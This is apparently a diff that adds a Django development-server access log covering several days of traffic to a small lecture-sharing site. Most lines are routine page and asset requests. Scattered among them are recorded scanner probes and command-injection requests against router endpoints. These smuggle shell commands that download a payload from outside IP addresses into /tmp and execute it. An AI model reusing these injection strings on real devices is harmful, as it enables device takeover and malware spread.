@@ -1,0 +1,333 @@
+[03/Aug/2018 13:16:49] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 13:16:56] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 13:16:58] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 13:17:00] "GET /login/ HTTP/1.1" 200 5094
+[03/Aug/2018 13:17:02] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 13:17:04] "GET /login/ HTTP/1.1" 200 5094
+[03/Aug/2018 13:17:19] "POST /login/ HTTP/1.1" 200 5222
+[03/Aug/2018 13:17:24] "POST /login/ HTTP/1.1" 302 0
+[03/Aug/2018 13:17:24] "GET /home/ HTTP/1.1" 200 11527
+[03/Aug/2018 13:17:24] "GET /static/images/artience_logo.png HTTP/1.1" 200 11063
+[03/Aug/2018 13:17:24] "GET /static/images/yhkim_lecture_12 HTTP/1.1" 200 3411
+[03/Aug/2018 13:17:24] "GET /static/images/yhkim_lecture_14 HTTP/1.1" 200 2087
+[03/Aug/2018 13:17:24] "GET /static/images/yhkim_lecture_15 HTTP/1.1" 200 2095
+[03/Aug/2018 13:17:38] "GET /new/ HTTP/1.1" 200 7851
+[03/Aug/2018 13:17:39] "GET /summernote/editor/id_fields/ HTTP/1.1" 200 6218
+[03/Aug/2018 13:17:39] "GET /static/summernote/summernote.css HTTP/1.1" 200 15522
+[03/Aug/2018 13:17:39] "GET /static/summernote/django_summernote.css HTTP/1.1" 200 70
+[03/Aug/2018 13:17:39] "GET /static/summernote/jquery.ui.widget.js HTTP/1.1" 200 16089
+[03/Aug/2018 13:17:39] "GET /static/summernote/jquery.iframe-transport.js HTTP/1.1" 200 10891
+[03/Aug/2018 13:17:39] "GET /static/summernote/jquery.fileupload.js HTTP/1.1" 200 63855
+[03/Aug/2018 13:17:39] "GET /static/summernote/summernote.min.js HTTP/1.1" 200 102691
+[03/Aug/2018 13:17:39] "GET /static/summernote/ResizeSensor.js HTTP/1.1" 200 7678
+[03/Aug/2018 13:17:39] "GET /static/summernote/font/summernote.woff?0d0d5fac99cc8774d89eb08b1a8323c4 HTTP/1.1" 200 10192
+[03/Aug/2018 13:18:07] "GET /home/ HTTP/1.1" 200 11527
+[03/Aug/2018 13:18:35] "GET / HTTP/1.1" 200 5607
+Not Found: /robots.txt
+[03/Aug/2018 13:27:25] "GET /robots.txt HTTP/1.1" 404 3793
+[03/Aug/2018 13:27:25] "GET /home/ HTTP/1.1" 200 11527
+[03/Aug/2018 13:27:26] "GET /static/images/favicon.ico HTTP/1.1" 200 116618
+[03/Aug/2018 13:27:27] "GET /home/ HTTP/1.1" 200 11527
+[03/Aug/2018 13:27:54] "GET /home/ HTTP/1.1" 200 11527
+[03/Aug/2018 13:42:24] "GET / HTTP/1.1" 200 5607
+Not Found: /robots.txt
+[03/Aug/2018 13:50:00] "GET /logout/ HTTP/1.1" 302 0
+[03/Aug/2018 13:50:00] "GET /robots.txt HTTP/1.1" 404 3793
+[03/Aug/2018 13:50:00] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 13:50:00] "GET /static/css/styles.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/js/scripts.js HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/js/bootstrap-datetimepicker.min.js HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/js/bootstrap-datepicker.kr.js HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/images/main.png HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/base/base.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/config/variables.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/base/normalize.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/modules/components.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/modules/footer.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/modules/form.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/modules/card.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/modules/navbar.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/pages/profile.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/pages/index.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/pages/home.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/pages/upload.css HTTP/1.1" 304 0
+[03/Aug/2018 13:50:00] "GET /static/css/modules/bootstrap-datetimepicker.min.css HTTP/1.1" 304 0
+[03/Aug/2018 14:12:21] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 14:12:21] "GET /static/css/styles.css HTTP/1.1" 200 494
+[03/Aug/2018 14:12:21] "GET /static/js/scripts.js HTTP/1.1" 200 1
+[03/Aug/2018 14:12:21] "GET /static/js/jquery-3.3.1.min.js HTTP/1.1" 200 86927
+[03/Aug/2018 14:12:21] "GET /static/js/bootstrap-datepicker.kr.js HTTP/1.1" 200 543
+[03/Aug/2018 14:12:21] "GET /static/images/main.png HTTP/1.1" 200 56938
+[03/Aug/2018 14:12:21] "GET /static/js/bootstrap-datetimepicker.min.js HTTP/1.1" 200 30005
+[03/Aug/2018 14:12:21] "GET /static/css/config/variables.css HTTP/1.1" 200 482
+[03/Aug/2018 14:12:21] "GET /static/css/base/base.css HTTP/1.1" 200 653
+[03/Aug/2018 14:12:21] "GET /static/css/base/normalize.css HTTP/1.1" 200 6051
+[03/Aug/2018 14:12:21] "GET /static/css/modules/components.css HTTP/1.1" 200 441
+[03/Aug/2018 14:12:21] "GET /static/css/modules/footer.css HTTP/1.1" 200 719
+[03/Aug/2018 14:12:21] "GET /static/css/modules/form.css HTTP/1.1" 200 966
+[03/Aug/2018 14:12:21] "GET /static/css/modules/navbar.css HTTP/1.1" 200 1361
+[03/Aug/2018 14:12:21] "GET /static/css/modules/card.css HTTP/1.1" 200 2022
+[03/Aug/2018 14:12:21] "GET /static/css/pages/upload.css HTTP/1.1" 200 1299
+[03/Aug/2018 14:12:21] "GET /static/css/pages/profile.css HTTP/1.1" 200 2101
+[03/Aug/2018 14:12:21] "GET /static/css/pages/index.css HTTP/1.1" 200 582
+[03/Aug/2018 14:12:21] "GET /static/css/pages/home.css HTTP/1.1" 200 1174
+[03/Aug/2018 14:12:21] "GET /static/css/modules/bootstrap-datetimepicker.min.css HTTP/1.1" 200 6459
+[03/Aug/2018 14:12:25] "GET /static/images/favicon.png HTTP/1.1" 404 1682
+[03/Aug/2018 14:12:25] "GET /static/images/favicon.ico HTTP/1.1" 200 116618
+[03/Aug/2018 14:13:16] "POST /register/ HTTP/1.1" 302 0
+[03/Aug/2018 14:13:16] "GET /login/ HTTP/1.1" 200 5094
+[03/Aug/2018 14:13:22] "POST /login/ HTTP/1.1" 302 0
+[03/Aug/2018 14:13:22] "GET /home/ HTTP/1.1" 200 11528
+[03/Aug/2018 14:13:22] "GET /static/images/artience_logo.png HTTP/1.1" 200 11063
+[03/Aug/2018 14:13:22] "GET /static/images/yhkim_lecture_12 HTTP/1.1" 200 3411
+[03/Aug/2018 14:13:22] "GET /static/images/yhkim_lecture_15 HTTP/1.1" 200 2095
+[03/Aug/2018 14:13:22] "GET /static/images/yhkim_lecture_14 HTTP/1.1" 200 2087
+[03/Aug/2018 14:13:39] "GET /logout/ HTTP/1.1" 302 0
+[03/Aug/2018 14:13:39] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 14:13:41] "GET /login/ HTTP/1.1" 200 5094
+[03/Aug/2018 14:13:48] "POST /login/ HTTP/1.1" 302 0
+[03/Aug/2018 14:13:48] "GET /home/ HTTP/1.1" 200 11528
+[03/Aug/2018 14:13:51] "GET /new/ HTTP/1.1" 200 7852
+[03/Aug/2018 14:13:51] "GET /summernote/editor/id_fields/ HTTP/1.1" 200 6218
+[03/Aug/2018 14:13:51] "GET /static/summernote/jquery.ui.widget.js HTTP/1.1" 200 16089
+[03/Aug/2018 14:13:51] "GET /static/summernote/jquery.iframe-transport.js HTTP/1.1" 200 10891
+[03/Aug/2018 14:13:51] "GET /static/summernote/django_summernote.css HTTP/1.1" 200 70
+[03/Aug/2018 14:13:51] "GET /static/summernote/summernote.css HTTP/1.1" 200 15522
+[03/Aug/2018 14:13:51] "GET /static/summernote/ResizeSensor.js HTTP/1.1" 200 7678
+[03/Aug/2018 14:13:51] "GET /static/summernote/summernote.min.js HTTP/1.1" 200 102691
+[03/Aug/2018 14:13:51] "GET /static/summernote/jquery.fileupload.js HTTP/1.1" 200 63855
+[03/Aug/2018 14:13:52] "GET /static/summernote/font/summernote.woff?0d0d5fac99cc8774d89eb08b1a8323c4 HTTP/1.1" 200 10192
+/usr/local/lib/python3.5/dist-packages/django/db/models/fields/__init__.py:1423: RuntimeWarning: DateTimeField Post.date received a naive datetime (2018-08-03 13:16:45.259237) while time zone support is active.
+  RuntimeWarning)
+/usr/local/lib/python3.5/dist-packages/django/db/models/fields/__init__.py:1423: RuntimeWarning: DateTimeField Post.lecture_date received a naive datetime (2018-08-10 15:00:00) while time zone support is active.
+  RuntimeWarning)
+[03/Aug/2018 14:15:49] "POST /upload/ HTTP/1.1" 302 0
+[03/Aug/2018 14:15:49] "GET /home/ HTTP/1.1" 200 13380
+[03/Aug/2018 14:15:49] "GET /static/images/hsjang_lecture_1 HTTP/1.1" 200 1150
+[03/Aug/2018 14:16:24] "GET /new/ HTTP/1.1" 200 7852
+[03/Aug/2018 14:16:24] "GET /summernote/editor/id_fields/ HTTP/1.1" 200 6218
+Not Found: /muieblackcat
+[03/Aug/2018 14:17:29] "GET /muieblackcat HTTP/1.1" 404 3795
+Not Found: //phpMyAdmin/scripts/setup.php
+[03/Aug/2018 14:17:30] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 3846
+Not Found: //phpmyadmin/scripts/setup.php
+[03/Aug/2018 14:17:30] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 3846
+Not Found: //pma/scripts/setup.php
+[03/Aug/2018 14:17:30] "GET //pma/scripts/setup.php HTTP/1.1" 404 3825
+Not Found: //myadmin/scripts/setup.php
+[03/Aug/2018 14:17:31] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 3837
+Not Found: //MyAdmin/scripts/setup.php
+[03/Aug/2018 14:17:31] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 3837
+[03/Aug/2018 14:21:19] "GET /home/ HTTP/1.1" 200 13380
+[03/Aug/2018 14:21:19] "GET /static/images/hsjang_lecture_1 HTTP/1.1" 304 0
+[03/Aug/2018 15:23:34] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 15:49:33] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 15:55:19] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 16:07:19] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 16:35:26] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 16:50:20] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 17:15:34] "GET / HTTP/1.1" 200 5607
+[03/Aug/2018 17:31:39] "GET / HTTP/1.0" 200 5607
+Not Found: /robots.txt
+[03/Aug/2018 17:42:57] "GET /login/ HTTP/1.1" 200 5094
+[03/Aug/2018 17:42:57] "GET /robots.txt HTTP/1.1" 404 3793
+[03/Aug/2018 17:42:57] "GET /static/css/styles.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/js/scripts.js HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/js/bootstrap-datetimepicker.min.js HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/js/bootstrap-datepicker.kr.js HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/images/main.png HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/config/variables.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/base/normalize.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/base/base.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/modules/form.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/modules/components.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/modules/footer.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/modules/navbar.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/modules/card.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/pages/index.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/pages/home.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/pages/profile.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/pages/upload.css HTTP/1.1" 304 0
+[03/Aug/2018 17:42:57] "GET /static/css/modules/bootstrap-datetimepicker.min.css HTTP/1.1" 304 0
+[03/Aug/2018 18:15:16] "GET / HTTP/1.0" 200 5607
+[03/Aug/2018 18:51:14] "GET / HTTP/1.0" 200 5607
+Not Found: /cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup
+[03/Aug/2018 20:04:09] "GET /cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%20%3B%20cd%20/tmp%3Bwget%20http://178.128.11.199/rvs%20-O%20/tmp/rz%3Bchmod%20777%20/tmp/rz%3Bsh%20/tmp/rz%20 HTTP/1.0" 404 4119
+[03/Aug/2018 20:44:06] "GET / HTTP/1.0" 200 5607
+[03/Aug/2018 22:37:39] "GET / HTTP/1.1" 200 5607
+Not Found: /phpmyadmin
+[03/Aug/2018 23:02:03] "GET /phpmyadmin HTTP/1.1" 404 3789
+Not Found: /phpmyadmin
+[03/Aug/2018 23:02:03] "GET /phpmyadmin HTTP/1.1" 404 3789
+[04/Aug/2018 00:11:35] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 00:50:03] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 00:52:37] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 02:21:42] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 02:42:18] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 03:44:55] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 03:56:47] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[04/Aug/2018 04:08:56] "GET /login.cgi?cli=aa%20aa%27;wget%20http://199.195.254.118/dlink%20-O%20-%3E%20/tmp/xd;sh%20/tmp/xd%27$ HTTP/1.1" 404 3870
+[04/Aug/2018 05:23:47] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 07:04:23] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 07:56:48] "GET / HTTP/1.0" 200 5607
+[04/Aug/2018 08:10:22] "GET / HTTP/1.0" 200 5607
+[04/Aug/2018 09:58:57] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 10:07:23] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 11:31:50] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 12:15:19] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 12:15:20] "GET /static/css/styles.css HTTP/1.1" 200 494
+[04/Aug/2018 12:15:20] "GET /static/js/scripts.js HTTP/1.1" 200 1
+[04/Aug/2018 12:15:20] "GET /static/js/bootstrap-datetimepicker.min.js HTTP/1.1" 200 30005
+[04/Aug/2018 12:15:20] "GET /static/js/jquery-3.3.1.min.js HTTP/1.1" 200 86927
+[04/Aug/2018 12:15:20] "GET /static/js/bootstrap-datepicker.kr.js HTTP/1.1" 200 543
+[04/Aug/2018 12:15:20] "GET /static/css/config/variables.css HTTP/1.1" 200 482
+[04/Aug/2018 12:15:20] "GET /static/css/base/normalize.css HTTP/1.1" 200 6051
+[04/Aug/2018 12:15:20] "GET /static/css/modules/footer.css HTTP/1.1" 200 719
+[04/Aug/2018 12:15:20] "GET /static/css/modules/form.css HTTP/1.1" 200 966
+[04/Aug/2018 12:15:20] "GET /static/css/modules/navbar.css HTTP/1.1" 200 1361
+[04/Aug/2018 12:15:20] "GET /static/css/pages/index.css HTTP/1.1" 200 582
+[04/Aug/2018 12:15:20] "GET /static/css/pages/profile.css HTTP/1.1" 200 2101
+[04/Aug/2018 12:15:20] "GET /static/css/pages/home.css HTTP/1.1" 200 1174
+[04/Aug/2018 12:15:20] "GET /static/css/pages/upload.css HTTP/1.1" 200 1299
+[04/Aug/2018 12:15:20] "GET /static/css/modules/bootstrap-datetimepicker.min.css HTTP/1.1" 200 6459
+[04/Aug/2018 12:15:20] "GET /static/css/modules/card.css HTTP/1.1" 200 2022
+[04/Aug/2018 12:15:20] "GET /static/css/modules/components.css HTTP/1.1" 200 441
+[04/Aug/2018 12:15:20] "GET /static/css/base/base.css HTTP/1.1" 200 653
+[04/Aug/2018 12:15:20] "GET /static/images/main.png HTTP/1.1" 200 56938
+[04/Aug/2018 12:22:43] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 13:48:15] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 13:52:39] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 14:04:28] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 15:14:30] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 15:43:05] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[04/Aug/2018 16:51:51] "GET /login.cgi?cli=aa%20aa%27;wget%20http://178.128.11.199/qtx.mips%20-O%20-%3E%20/tmp/rz;chmod%20777%20/tmp/rz;/tmp/rz%27$ HTTP/1.1" 404 3889
+[04/Aug/2018 17:06:40] "GET / HTTP/1.0" 200 5607
+[04/Aug/2018 17:10:00] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 18:29:21] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 18:38:02] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 18:55:23] "GET / HTTP/1.0" 200 5607
+Not Found: /login.cgi
+[04/Aug/2018 19:14:23] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+[04/Aug/2018 19:35:48] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[04/Aug/2018 21:32:50] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+[04/Aug/2018 22:02:43] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 22:14:54] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 23:11:38] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 23:21:43] "GET / HTTP/1.1" 200 5607
+[04/Aug/2018 23:36:46] "GET / HTTP/1.0" 200 5607
+[04/Aug/2018 23:49:06] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 00:41:32] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[05/Aug/2018 01:21:03] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+[05/Aug/2018 01:57:49] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 02:27:32] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 03:04:46] code 400, message Bad request syntax ('\x05\x01\x00')
+[05/Aug/2018 03:04:46] " " 400 -
+[05/Aug/2018 03:04:54] code 400, message Bad request syntax ('\x05\x01\x00')
+[05/Aug/2018 03:04:54] " " 400 -
+[05/Aug/2018 03:05:02] code 400, message Bad request syntax ('\x05\x01\x00')
+[05/Aug/2018 03:05:02] " " 400 -
+[05/Aug/2018 03:06:25] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00P\x05¼Ò')
+[05/Aug/2018 03:06:25] " P¼Ò " 400 -
+[05/Aug/2018 03:06:33] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00P\x05¼Ò')
+[05/Aug/2018 03:06:33] " P¼Ò " 400 -
+[05/Aug/2018 03:06:42] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00P\x05¼Ò')
+[05/Aug/2018 03:06:42] " P¼Ò " 400 -
+[05/Aug/2018 04:03:20] "GET / HTTP/1.0" 200 5607
+Not Found: /login.cgi
+[05/Aug/2018 04:58:00] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+Forbidden (CSRF cookie not set.): /
+[05/Aug/2018 04:59:01] "PROPFIND / HTTP/1.1" 403 2868
+[05/Aug/2018 06:51:40] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 07:21:29] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 07:47:11] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 08:31:53] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 09:04:22] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 09:04:22] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 10:13:32] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 10:45:00] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 10:45:58] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 12:11:14] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 12:28:16] "GET / HTTP/1.0" 200 5607
+[05/Aug/2018 13:40:32] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 15:41:27] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 15:48:03] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 16:58:37] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 17:05:21] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 17:13:04] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 17:22:21] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 17:31:58] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[05/Aug/2018 18:05:03] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+[05/Aug/2018 18:36:58] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 21:17:08] "GET / HTTP/1.1" 200 5607
+[05/Aug/2018 22:15:34] "GET / HTTP/1.1" 200 5607
+Not Found: /RPC2
+[05/Aug/2018 22:19:56] "POST /RPC2 HTTP/1.1" 404 3772
+[05/Aug/2018 23:33:11] "GET / HTTP/1.0" 200 5607
+[05/Aug/2018 23:33:12] "GET / HTTP/1.0" 200 5607
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[06/Aug/2018 00:15:11] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 01:52:11] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[06/Aug/2018 02:52:17] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+[06/Aug/2018 02:55:18] "GET / HTTP/1.0" 200 5607
+[06/Aug/2018 03:33:53] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 03:53:00] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 03:56:35] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 04:25:12] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 04:49:11] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 04:50:56] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 05:08:30] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 05:57:36] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 06:04:06] "GET / HTTP/1.0" 200 5607
+[06/Aug/2018 06:04:10] "GET / HTTP/1.0" 200 5607
+[06/Aug/2018 07:07:28] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 07:44:59] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 09:45:34] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 13:25:33] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 14:02:26] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 15:00:30] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 16:49:57] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 17:03:41] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 17:54:46] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 18:41:20] "GET / HTTP/1.1" 200 5607
+Not Found: /login.cgi
+[06/Aug/2018 18:46:43] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3864
+[06/Aug/2018 19:53:15] "GET / HTTP/1.1" 200 5607
+[06/Aug/2018 19:59:44] "GET / HTTP/1.1" 200 5607
+Not Found: /struts2-rest-showcase/orders.xhtml
+[06/Aug/2018 20:22:48] "GET /struts2-rest-showcase/orders.xhtml HTTP/1.1" 404 3861
+Not Found: /index.action
+[06/Aug/2018 20:22:49] "GET /index.action HTTP/1.1" 404 3795
+Not Found: /index.do
+[06/Aug/2018 20:22:49] "GET /index.do HTTP/1.1" 404 3783
+[06/Aug/2018 20:45:39] "GET / HTTP/1.0" 200 5607
